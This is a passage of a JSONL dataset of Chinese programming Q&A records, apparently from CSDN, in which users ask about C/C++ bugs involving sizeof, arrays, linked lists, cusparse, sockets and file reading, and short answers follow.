_CRT_SECURE_NO_WARNINGS. See online help for details.    data_structure    D:\\programs\\visual_studio_projects\\data_structure\\header_insertion_for_singlelinked_list.cpp    25    ", "\n", "我的解答思路和尝试过的方法", "\n", "1）换成其他IDE, 我换的是Dev-C++，在Dev-C++上编译没有问题", "2）按照报错内容的提示，把scanf改成scanf_s就没有问题了", "\n", "我想要达到的结果", "\n", "请问为什么在Visual Studio上无法使用scanf函数，为什么改成scanf_s以后又可以使用了？"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;void select(int array[]) 数组名 array 作为形参&amp;#xff0c;在函数里退化为指针&amp;#xff0c;所以  int length &amp;#61; sizeof(array)/sizeof(array[0]);  得到的 length &amp;#61;1 是错误的。函数的形参必须增加数组的长度值。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c语言数组排序问题，为啥出错了？", ["做一个数组的排序，不知道这样写有什么问题，代码如下。length放在主函数里面定义就可以正常运行，放在函数里定义就不行了，求帮忙解释下原因。", "\n", "#include<stdio.h>", "\n", "void", " ", "select", "(", "int", " ", "array", "[]);\n", "int", " main()\n{\n        ", "int", " ", "array", "[]={", "3", ",", "55", ",", "23", ",", "13", ",", "5", ",", "88", ",", "57", ",", "95", ",", "28", ",", "23", ",", "56", "};\n        ", "select", "(", "array", ");\n        ", "return", " ", "0", ";\n}\n", "void", " ", "select", "(", "int", " ", "array", "[])\n{\n        ", "int", " length = sizeof(", "array", ")/sizeof(", "array", "[", "0", "]);\n        ", "int", " i,j;\n        ", "int", " ", "temp", ";\n        ", "for", "(i = ", "0", "; i < length; i++)\n        {\n                ", "for", "(j = i; j < length", "-1", ";j++)\n                {\n                        ", "if", "(", "array", "[i]>", "array", "[j+", "1", "])\n                        {\n                                ", "temp", " = ", "array", "[j+", "1", "];\n                               ", "array", "[j+", "1", "] = ", "array", "[i];\n                                ", "array", "[i] = ", "temp", ";\n                        }\n                }\n                printf(\"%d \",", "array", "[i]);\n        }\n        printf(\"\\n%d\",length);\n}\n\n", "\n", "ntitled", "-1.", "c: ", "In", " ", "function", " ", "'select'", ":\nUntitled", "-1.", "c:", "11", ":", "28", ": ", "warning", ": ", "'sizeof'", " ", "on", " ", "array", " ", "function", " parameter ", "'array'", " will ", "return", " size ", "of", " ", "'int *'", " [-Wsizeof-", "array", "-argument]\n   ", "11", " |         ", "int", " length = sizeof(", "array", ")/sizeof(", "array", "[", "0", "]);\n      |                            ^\nUntitled", "-1.", "c:", "9", ":", "17", ": note: declared here\n    ", "9", " | ", "void", " ", "select", "(", "int", " ", "array", "[])\n      |             ~~~~^~~~~~~\n", "3", " ", "55", " \n", "2", "\n\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;couarr各元素初始都要设置为0&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-selector-tag\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-selector-tag\"&gt;couarr&lt;/span&gt;&lt;span class=\"hljs-selector-attr\"&gt;[l]&lt;/span&gt;;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;改成&lt;/p&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;int couarr[l] &lt;span class=\"hljs-operator\"&gt;&amp;#61;&lt;/span&gt; {&lt;!-- --&gt;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;}&lt;span class=\"hljs-comment\"&gt;;&lt;/span&gt;\n&lt;/code&gt;&lt;/pre&gt;\n&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;&lt;span class=\"hljs-meta\"&gt;#&lt;span class=\"hljs-keyword\"&gt;include&lt;/span&gt;&lt;span class=\"hljs-string\"&gt;&amp;lt;iostream&amp;gt;&lt;/span&gt;&lt;/span&gt;\n&lt;span class=\"hljs-keyword\"&gt;using&lt;/span&gt; &lt;span class=\"hljs-keyword\"&gt;namespace&lt;/span&gt; std;\n\n&lt;span class=\"hljs-function\"&gt;&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; &lt;span class=\"hljs-title\"&gt;main&lt;/span&gt;&lt;span class=\"hljs-params\"&gt;()&lt;/span&gt;\n&lt;/span&gt;{\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; arr[] &amp;#61; {&lt;!-- --&gt;&lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;5&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;3&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;7&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;6&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;2&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;8&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;9&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;4&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;3&lt;/span&gt;, &lt;span class=\"hljs-number\"&gt;3&lt;/span&gt;};\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; len &amp;#61; &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(arr) / &lt;span class=\"hljs-built_in\"&gt;sizeof&lt;/span&gt;(&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt;);\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; max &amp;#61; arr[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;]; &lt;span class=\"hljs-comment\"&gt;//记录数列的最大值&lt;/span&gt;\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; min &amp;#61; arr[&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;]; &lt;span class=\"hljs-comment\"&gt;//记录数列的最小值&lt;/span&gt;\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; len; i&amp;#43;&amp;#43;)\n    {\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (arr[i] &amp;gt; max)\n        {\n            max &amp;#61; arr[i];\n        }\n        &lt;span class=\"hljs-keyword\"&gt;if&lt;/span&gt; (arr[i] &amp;lt; min)\n        {\n            min &amp;#61; arr[i];\n        }\n    }\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; l &amp;#61; max - min &amp;#43; &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;; &lt;span class=\"hljs-comment\"&gt;//计算出数列最大最小值得差值&lt;/span&gt;\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; couarr[l] &amp;#61; {&lt;!-- --&gt;&lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;};         &lt;span class=\"hljs-comment\"&gt;//        couarr各元素初始都要设置为0&lt;/span&gt;\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; len; i&amp;#43;&amp;#43;)\n    {\n        couarr[arr[i] - min]&amp;#43;&amp;#43;; &lt;span class=\"hljs-comment\"&gt;//统计元素个数&lt;/span&gt;\n    }\n\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; sum &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; l; i&amp;#43;&amp;#43;) &lt;span class=\"hljs-comment\"&gt;//统计数组做变形&amp;#xff0c;后面的元素等于前面元素的和&lt;/span&gt;\n    {\n        sum &amp;#43;&amp;#61; couarr[i];\n        couarr[i] &amp;#61; sum;\n    }\n    &lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; sortarr[len];\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i &amp;#61; len - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;; i &amp;gt;&amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i--) &lt;span class=\"hljs-comment\"&gt;//倒序遍历原始数组&amp;#xff0c;从统计数组中找到正确位置&lt;/span&gt;\n    {\n        sortarr[couarr[arr[i] - min] - &lt;span class=\"hljs-number\"&gt;1&lt;/span&gt;] &amp;#61; arr[i];\n        couarr[arr[i] - min]--;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;for&lt;/span&gt; (&lt;span class=\"hljs-type\"&gt;int&lt;/span&gt; i &amp;#61; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;; i &amp;lt; len; i&amp;#43;&amp;#43;)\n    {\n        cout &amp;lt;&amp;lt; sortarr[i] &amp;lt;&amp;lt; &lt;span class=\"hljs-string\"&gt;&amp;#39; &amp;#39;&lt;/span&gt;;\n    }\n    &lt;span class=\"hljs-keyword\"&gt;return&lt;/span&gt; &lt;span class=\"hljs-number\"&gt;0&lt;/span&gt;;\n}\n&lt;/code&gt;&lt;/pre&gt;\n&lt;p&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/49039170874615.png\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;\n&lt;blockquote&gt;\n&lt;p&gt;如有帮助&amp;#xff0c;请点击我的回答下方的&lt;strong&gt;【采纳该答案】&lt;/strong&gt;按钮帮忙采纳下&amp;#xff0c;谢谢!&lt;br /&gt;&lt;/p&gt;&lt;p class=\"md_img_container\"&gt;&lt;img align=\"left\" alt=\"img\" src=\"https://img-mid.csdnimg.cn/release/static/image/mid/ask/101342676936187.png\" class=\"md_img\" /&gt;&lt;/p&gt;&lt;p&gt;&lt;/p&gt;\n&lt;/blockquote&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c++计数排序没有输出结果", ["c++计数排序没有输出结果", "\n", "#include ", "\n", "#include ", "using namespace std;", "\n", "int main()", "{", "    int arr[] = { 1,5,3,7,6,2,8,9,4,3,3 };", "    int len=sizeof(arr)/sizeof(int);", "    int max = arr[0];//记录数列的最大值", "    int min = arr[0];//记录数列的最小值", "    for(int i=0;i<len;i++)", "    {", "        if(arr[i]>max)", "        {", "            max = arr[i];", "        }", "        if(arr[i]<min)", "        {", "            min = arr[i];", "        }", "    }", "    int l = max-min+1;//计算出数列最大最小值得差值", "    int couarr[l];//*a代表的是c语言中的指针，意思就是一段内存空间，new int()是指开辟的是能够放入int类型数据的内存空间。", "    for(int i=0;i<len;i++)", "    {", "        couarr[arr[i]-min]++;//统计元素个数", "    }", "\n", "int", " ", "sum", " = ", "0", ";\n", "for", "(", "int", " i=", "0", ";i<l;i++)//统计数组做变形，后面的元素等于前面元素的和\n{\n    ", "sum", " += couarr[i];\n    couarr[i]=", "sum", ";\n}\n", "int", " sortarr[", "len", "];\n", "for", "(", "int", " i=", "len", "-", "1", ";i>=", "0", ";i--)//倒序遍历原始数组，从统计数组中找到正确位置\n{\n    sortarr[couarr[arr[i]-", "min", "]-", "1", "]=arr[i];\n    couarr[arr[i]-", "min", "]--;\n}\n", "for", "(", "int", " i=", "0", ";i<", "len", ";i++)\n{\n    cout<<sortarr[i]<<", "' '", ";\n}\n", "return", " ", "0", ";\n", "\n", "}", "\n", "无报错无输出结果", "\n", "帮忙看看哪出问题了"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;CUDA_R_32F数据类型与double不匹配&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["刚学cusparse库，做spmv乘法时代码没报错没有得到自己想要的结果", ["#include <stdio.h>", "#include <stdlib.h>", "#include <assert.h>", "#include <cuda_runtime.h>", "#include <cusparse.h>", "\n", "// error check macros", "#define CUSPARSE_CHECK(x) {cusparseStatus_t _c=x; if (_c != CUSPARSE_STATUS_SUCCESS) {printf(\"cusparse fail: %d, line: %d\\n\", (int)_c, ", "LINE", "); exit(-1);}}", "\n", "#define cudaCheckErrors(msg) ", "    do { ", "        cudaError_t __err = cudaGetLastError(); ", "        if (__err != cudaSuccess) { ", "            fprintf(stderr, \"Fatal error: %s (%s at %s:%d)\\n\", ", "                msg, cudaGetErrorString(__err), ", "                ", "FILE", ", ", "LINE", "); ", "            fprintf(stderr, \"*** FAILED - ABORTING\\n\"); ", "            exit(1); ", "        } ", "    } while (0)", "\n", "int main()", "{", "    const int n = 3;", "    const int nnzA = 5;", "    const double h_valA[nnzA] = { 3.0, 2.0, 2.0, 2.0, 1.0 };", "    const int h_csrColIndA[nnzA] = { 0, 2, 1, 0, 2 };", "    const int h_csrRowPtrA[n+1] = { 0, 2, 3, 5 };", "    const double h_b[n] = { 3.5, 1.5, 2.0 };", "    int y[n] = { 0.0, 0.0, 0.0 };", "\n", "//CSR format of matrix A and Vector b (device)", "\n", "double", "* valA;\n", "int", "* csrRowPtrA;\n", "int", "* csrColIndA;\n", "double", "* b;\n", "double", "* Y;\n\n", "cudaMalloc", "((", "void", "**)&valA, nnzA * ", "sizeof", "(", "double", "));\n", "cudaMalloc", "((", "void", "**)&csrRowPtrA, (n + ", "1", ") * ", "sizeof", "(", "int", "));\n", "cudaMalloc", "((", "void", "**)&csrColIndA, nnzA * ", "sizeof", "(", "int", "));\n", "cudaMalloc", "((", "void", "**)&b, n * ", "sizeof", "(", "double", "));\n", "cudaMalloc", "((", "void", "**)&Y, n * ", "sizeof", "(", "double", "));\n", "cudaCheckErrors", "(", "\"cudaMalloc fail\"", ");\n\n", "cudaMemcpy", "(valA, h_valA, (", "size_t", ")(nnzA * ", "sizeof", "(", "double", ")), cudaMemcpyHostToDevice);\n", "cudaMemcpy", "(csrRowPtrA, h_csrRowPtrA, (", "size_t", ")((n + ", "1", ") * ", "sizeof", "(", "int", ")), cudaMemcpyHostToDevice);\n", "cudaMemcpy", "(csrColIndA, h_csrColIndA, (", "size_t", ")(nnzA * ", "sizeof", "(", "int", ")), cudaMemcpyHostToDevice);\n", "cudaMemcpy", "(b, h_b, (", "size_t", ")(n * ", "sizeof", "(", "double", ")), cudaMemcpyHostToDevice);\n", "cudaMemcpy", "(Y, y, (", "size_t", ")(n * ", "sizeof", "(", "double", ")), cudaMemcpyHostToDevice);\n", "cudaCheckErrors", "(", "\"cudaMemcpy fail\"", ");\n\n", "float", "      alpha = ", "1.0f", ";\n", "float", "      beta = ", "0.0f", ";\n\ncusparseHandle_t handle = ", "NULL", ";\ncusparseSpMatDescr_t matA;\ncusparseDnVecDescr_t vecX, vecY;\n", "void", "* dBuffer = ", "NULL", ";\n", "size_t", "               bufferSize = ", "0", ";\n", "CUSPARSE_CHECK", "(", "cusparseCreate", "(&handle));\n", "CUSPARSE_CHECK", "(", "cusparseCreateCsr", "(&matA, n, n, nnzA, csrRowPtrA, csrColIndA, valA,\n    CUSPARSE_INDEX_32I, CUSPARSE_INDEX_32I, CUSPARSE_INDEX_BASE_ZERO, CUDA_R_32F));\n\n", "CUSPARSE_CHECK", "(", "cusparseCreateDnVec", "(&vecX, n, b, CUDA_R_32F));\n\n", "CUSPARSE_CHECK", "(", "cusparseCreateDnVec", "(&vecY, n, Y, CUDA_R_32F));\n\n", "CUSPARSE_CHECK", "(", "cusparseSpMV_bufferSize", "(handle, CUSPARSE_OPERATION_NON_TRANSPOSE, &alpha, matA, vecX, &beta, vecY, CUDA_R_32F, CUSPARSE_MV_ALG_DEFAULT, &bufferSize));\n\n", "cudaMalloc", "(&dBuffer, bufferSize);\n", "cudaCheckErrors", "(", "\"cudaMalloc fail\"", ");\n", "CUSPARSE_CHECK", "(", "cusparseSpMV", "(handle, CUSPARSE_OPERATION_NON_TRANSPOSE, &alpha, matA, vecX, &beta, vecY, CUDA_R_32F, CUSPARSE_MV_ALG_DEFAULT, dBuffer));\n\n\n", "CUSPARSE_CHECK", "(", "cusparseDestroySpMat", "(matA));\n", "CUSPARSE_CHECK", "(", "cusparseDestroyDnVec", "(vecX));\n", "CUSPARSE_CHECK", "(", "cusparseDestroyDnVec", "(vecY));\n", "CUSPARSE_CHECK", "(", "cusparseDestroy", "(handle));\n\n", "cudaMemcpy", "(y, Y, n * ", "sizeof", "(", "double", "), cudaMemcpyDeviceToHost);\n", "cudaCheckErrors", "(", "\"cudaMemcpy fail\"", ");\n", "for", " (", "int", " i = ", "0", "; i < n; i++)\n{\n    ", "printf", "(", "\"x[%i] = %f\\n\"", ", i, y[i]);\n}\n", "cudaFree", "(dBuffer);\n", "cudaFree", "(csrRowPtrA);\n", "cudaFree", "(csrColIndA);\n", "cudaFree", "(valA);\n", "cudaFree", "(Y);\n", "cudaFree", "(b);\n\n", "return", " ", "0", ";\n", "\n", "}"]], "Tag": "程序设计"}
{"Answer": "```\r\nwhile(NULL!=p-&gt;Pnext &amp;&amp; i &lt;pos-1)\r\n检查这里的循环，是否遍历到链表外面（比如创建链表的时候，没有把最后节点的pNext设置为null）。\r\nfree(q);\r\nq所在节点，是通过malloc动态分配的么\r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C语言程序，单向动态链表删除结点，使用free(),报错   Trace/breakpoint trap", ["刚学习数据结构链表部分", "\n学习视频是郝斌老师数据结构的公开视频。", "\n\n", "主函数中调用了2个函数，一个是创建链表的函数，另一个是删除结点的函数。", "\n删除结点的时候使用了free（）,运行后报错Trace/breakpoint trap", "   ", "\n\n", "//创建一个链表\n\nPNODE creat_list(void)\n{\n    int len;//用来临时存放用户输入的结点的个数\n    int val;//用来临时存放用户输入的结点的数据\n    int i;\n    printf(\"请输入您要输入的链表的结点个数:\\nlen=\");\n    scanf(\"%d\",&len);\n    PNODE pHead = (PNODE)malloc(sizeof(NODE));\n    //生成了一个头结点\n\n    PNODE pTail = pHead; \n    pTail->Pnext = NULL; \n    if(NULL== pHead)\n    {\n        printf(\"内存分配失败，程序终止\\n\");\n        exit(-1);//内存都分配失败了，这个程序就没有继续的必要了\n    }\n    for(i=0;i<len;++i)\n    {\n        printf(\"请输入第%d个结点的数据\",i+1);\n        scanf(\"%d\",&val);\n        PNODE pNew = (PNODE)malloc(sizeof(PNODE));\n        pNew->data = val;\n        pTail->Pnext = pNew;\n        pNew->Pnext = NULL;\n        pTail = pNew;\n    }\n    return pHead;\n} \n\n", "\n\n", "//主函数\nint main (void)\n{\n    PNODE pHead = NULL;\n    pHead = creat_list();\n    int val;\n    if(is_empty(pHead)==1)\n    {\n        printf(\"此链表为空\\n\");\n    }\n    else\n    {\n        printf(\"此链表不为空\\n\");\n    }\n    printf(\"生成链表的长度为: %d\\n\",length_list(pHead));\n    traverse_list(pHead);//遍历链表\n    if (delete_list(pHead,3,&val))\n    {\n        printf(\"删除成功，您删除的结点的数据是%d\\n\",val);\n    }\n    else\n    {\n        printf(\"删除失败!\\n\");\n    }\n    traverse_list(pHead);//遍历链表\n\n    return 0;\n}\n\n", "\n\n", "//删除结点的函数\n_Bool delete_list(PNODE pHead,int pos,int * pVal)\n{\n    int i = 0;\n    PNODE p = pHead;\n    PNODE q;\n\n    while(NULL!=p->Pnext && i <pos-1)\n    {\n        p=p->Pnext;\n        ++i;\n    }//while 循环使得p指向了pos前的一个结点\n    if(i > pos-1 || NULL == p->Pnext)\n        return 0;\n\n    q = p->Pnext;//指向了要删除的结点\n    *pVal = q->data;\n    //删除P结点后面的结点\n    p->Pnext = p->Pnext->Pnext;\n    free(q);//这句报错！！！！！！！！！！！！！！！！！！！\n    q = NULL;\n    return 1;\n\n}\n\n"]], "Tag": "程序设计"}
{"Answer": "C语言里面，所谓的长度固定，是因为分配给它的内存只有5个int的空间，\r\n   1.你的电脑和编译器上，一个int应该是4个字节，5个不就是20个字节的内存嘛。但是5个元素的数组下标只能到4吧，\r\n\t       a[5]岂不是别人家的内存空间么?\r\n   2.数组名a就是一个不可变的指针(a是指针，但是a不能被赋值，比如a++),  a永远是数组的首地址(一生一世，永世不移)\r\n\t     但是通过指针方式 *(a+3)这样子是阔以的，因为a+3并没修改a的值啊\r\n\t 3.对于指针，有一种运算符叫[] ， []中的数字叫做偏移量，根据类型不同，每次偏移的距离不一样，比如int类型，你的int是32位(4字节），\r\n\t    那么a[0]就是从首地址向后偏移0个字节的内容，也就是首地址的内容\r\n\t 4. a[5]=26;  是指给从a(首地址开始),向后偏移5个int的字节数，如果你的数组定义的时候是5个元素，下标最大是4，a[4]是最后一个\r\n\t     C语言访问a[5]不会报错，但是你随便动用别人家的内存地址，就不怕系统不稳定，系统崩溃么？\r\n\t\t\t 这一块内存空间是空闲的算运气好，如果不空闲呢？ 最好不要随便动别人家的内存嘛，你申请的内存你可以改，别人家的不要动。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["在c语言里数组长度是固定的么（不讨论柔性数组）比如int a[5]={0,1,2,3,4}", ["如上定义以后，为什么 a[5]=5;这样赋值以后也是可以的，但是用sizeof(a)得到的还是20呢，可以给a[5]赋值这是不是代表它长度可变，，，虽然数组在汇编里就是一个地址然后往后不断偏移偏移，，可是老师讲数组都一再强调数组下标不能越界……往解答一二"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;选择c.&lt;br /&gt;sizeof(类名)  是把类中的数据类型占的内存加起来&amp;#xff0c;A占用12&amp;#xff0c;B.也占用12个。应该是相等的。所以第一个错误。其他均正确。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["有关面向对象的问题 不太理解可以解释一下吗", ["问题遇到的现象和发生背景", "\n", "(单选题)下面给出两个struct A1和struct A2的结构，以及部分代码：", "struct A1 {", "\n", "int  *items;", "\n", "int  val0;", "\n", "int  val1;", "\n", "int  val2;", "\n", "\n", "};", "\n", "struct A2 {", "\n", "int  items[", "0", "]", ";", "\n\nint  val0", ";", "\n\nint  val1", ";", "\n\nint  val2", ";", "\n", "\n", "};", "\n", "A1 a1;  ", "\n", "a1.items=&(a1.val0);", "\n", "a1.items[0] = 1;", "\n", "a1.items[1] = 2;", "\n", "a1.items[2] = 3;", "\n", "A2 a2;", "\n", "a2.items[0] = 11;", "\n", "a2.items[1] = 12;", "\n", "a2.items[2] = 13;", "\n", "对于下面给出的四个逻辑表达式，", "\n", "sizeof(A1)>sizeof(A2)", "\n", "a1.val0 ==1 ", "\n", "a2.val0 == 11", "\n", "*(a2.items+1)==12", "\n", "\n", "若不考虑编译时的警告信息和内存对齐方式，则正确说法的是：", "\n", "A. 1,2,3为真，4为假", "B.", "1为真，2,3,4为假", "\n", "C.", "2,3,4为真，1为假", "\n", "D. 1,2,3,4均为真"]], "Tag": "程序设计"}
{"Answer": "没有限制，但是标准控制台输出的缓冲区有限制。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["程序的标准输出字节长度有限制吗？", ["#include", "\n#include", "\n#include", "\n#include", "\n\n", "int main()", "\n{", "\n        FILE *read_fp;", "\n        char buffer[BUFSIZ + 1];", "\n        char chars_read;", "\n\n", "    memset(buffer, '\\0', sizeof(buffer));\n\n    read_fp = popen(\"ps ax\", \"r\");\n\n    if(read_fp != NULL)\n    {\n            chars_read = fread(buffer, sizeof(char), 128, read_fp);\n\n            while(chars_read > 0)\n            {\n                    printf(\"%s\", buffer);\n                    chars_read = fread(buffer, sizeof(char), 128, read_fp);\n            }\n\n            pclose(read_fp);\n            //printf(\"success\\n\");\n            exit(EXIT_SUCCESS);\n    }\n    printf(\"failed\\n\");\n    exit(EXIT_FAILURE);\n", "\n\n", "}", "\n\n", "\n", "\n\n", "这是源码1，无法进入while循环", "\n\n", "#include", "\n#include", "\n#include", "\n#include", "\n\n", "int main()", "\n{", "\n        FILE *read_fp;", "\n        char buffer[BUFSIZ + 1];", "\n        char chars_read;", "\n\n", "    memset(buffer, '\\0', sizeof(buffer));\n\n    read_fp = popen(\"ps ax\", \"r\");\n\n    if(read_fp != NULL)\n    {\n            chars_read = fread(buffer, sizeof(char), 127, read_fp);\n\n            while(chars_read > 0)\n            {\n                    printf(\"%s\", buffer);\n                    chars_read = fread(buffer, sizeof(char), 127, read_fp);\n            }\n\n            pclose(read_fp);\n            //printf(\"success\\n\");\n            exit(EXIT_SUCCESS);\n    }\n    printf(\"failed\\n\");\n    exit(EXIT_FAILURE);\n", "\n\n", "}", "\n\n", "\n", "\n\n", "这是源码2，可以进入循环。", "\n\n", "菜鸟在学习管道，遇到点问题，求高手。。。"]], "Tag": "程序设计"}
{"Answer": "什么是Socket　　 Socket接口是TCP/IP网络的API，Socket接口定义了许多函数或例程，程序员可以用它们来开发TCP/IP网络上的应用程序。要学Internet上的TCP/IP网络编程，必须理解Socket接口。　 　 Socket接口设计者......&lt;br/&gt;&lt;strong&gt;答案就在这里：&lt;/strong&gt;&lt;a target='_blank' rel='nofollow' href='http://blog.csdn.net/xuxinyl/article/details/6588131'&gt;linux socket 通信编程&lt;/a&gt;&lt;br/&gt;----------------------Hi，地球人，我是问答机器人小S，上面的内容就是我狂拽酷炫叼炸天的答案，除了赞同，你还有别的选择吗？", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["Linux编程socket通信疑问", ["Socket通信疑问", "\n\n", "今天，在进行socket通信时，发现一个问题，尝试许久后，问能找到答案。", "\n\n", "程序功能：", "\n\n", "　　使用socket通信编写服务器与客户端之间的循环应答，直到客户端发送\"bye\"，服务器发送命令关闭客户端，并且服务器关闭。", "\n具体问题描述：", "\n\n", "服务器程序：", "\n\n", "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <string.h>\n#include <sys/un.h>\n\nint main(void){\n\n    int socketfd = socket(AF_LOCAL,SOCK_DGRAM,0);\n    if ( socketfd == -1 ){\n        perror(\"socket\");\n        exit(-1);\n    }\n    struct sockaddr_un add;\n    add.sun_family = AF_UNIX ;\n    strcpy(add.sun_path,\"./sigcom\");\n\n    //unlink(\"./sigcom\");\n\n    int res = bind(socketfd,(struct sockaddr *)&add,sizeof(add));\n    if( res == -1){\n        perror(\"bind\");\n        exit(-1);\n    }\n\n    // res = connect(socketfd,(struct sockaddr *)&add,sizeof(add));\n    // if( res == -1){\n    //     perror(\"bind\");\n    //     exit(-1);\n    // }\n\n    char buf[20];\n\n    while(1){\n        read(socketfd,buf,sizeof(buf));\n        printf(\"%s\\n\",buf);\n\n        if (!strcmp(buf,\"bye\")){\n            write(socketfd,\"goodbye\",sizeof(\"goodbye\"));\n            printf(\"GoodBye!\\n\");\n            break;\n        }else{\n            int d = write(socketfd,\"Recived!\",sizeof(\"Recived!\"));\n            if (d == -1){\n                perror(\"write\");\n            }\n            printf(\"Send!\\n\");\n        }\n    }\n\n    close(socketfd);\n    return 0;\n}\n", "\n\n", "客户端程序：", "\n\n", "#include <stdio.h>\n#include <stdlib.h>\n#include <unistd.h>\n#include <sys/types.h>\n#include <sys/socket.h>\n#include <string.h>\n#include <sys/un.h>\n\nint main(void){\n\n    int socketfd = socket(AF_LOCAL,SOCK_DGRAM,0);\n    if ( socketfd == -1 ){\n        perror(\"socket\");\n        exit(-1);\n    }\n    struct sockaddr_un add;\n    add.sun_family = AF_UNIX ;\n    strcpy(add.sun_path,\"./sigcom\");\n\n    int res = connect(socketfd,(struct sockaddr *)&add,sizeof(add));\n    if( res == -1){\n        perror(\"connect\");\n        exit(-1);\n    }\n\n    char buf[20];\n\n    while(1){\n        scanf(\"%s\",buf);\n        write(socketfd,buf,sizeof(buf));\n\n        read(socketfd,buf,sizeof(buf));\n        printf(\"%s\\n\",buf);\n        if (!strcmp(buf,\"goodbye\")){\n            printf(\"%s\\n\",buf);\n            break;\n        }else{\n            printf(\"%s\\n\",buf);\n        }\n    }\n\n    printf(\"退出通信！\\n\");\n\n    close(socketfd);\n    return 0;\n}\n", "\n\n", "　　其中，在服务器这段程序中：", "\n\n", "    while(1){\n        read(socketfd,buf,sizeof(buf));\n        printf(\"%s\\n\",buf);\n\n        if (!strcmp(buf,\"bye\")){\n            write(socketfd,\"goodbye\",sizeof(\"goodbye\"));\n            printf(\"GoodBye!\\n\");\n            break;\n        }else{\n            int d = write(socketfd,\"Recived!\",sizeof(\"Recived!\"));\n            if (d == -1){\n                perror(\"write\");\n            }\n            printf(\"Send!\\n\");\n        }\n    }\n", "\n\n", "\"write\"函数出错：Transport endpoint is not connected。", "\n\n", "在各种尝试后未能找到解决办法。"]], "Tag": "程序设计"}
{"Answer": "while 后多一个分号 ;\r\n所以无论  while 是否成立都会执行的。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": [" fread(）> 0 入口条件为假，为何进入了循环", ["片段代码：", "\n\n", "while((num = fread(temp, sizeof(char), 512, ifp)) > 0);\n {\n    fwrite(temp, sizeof(char), 512, ofp);\n    printf(\"%d\", num);\n}\n", "\n\n", "printf(\"%d\", num); 得到的输出为0.", "\n\n", "ifp指向的文件只有几个字符小于512."]], "Tag": "程序设计"}
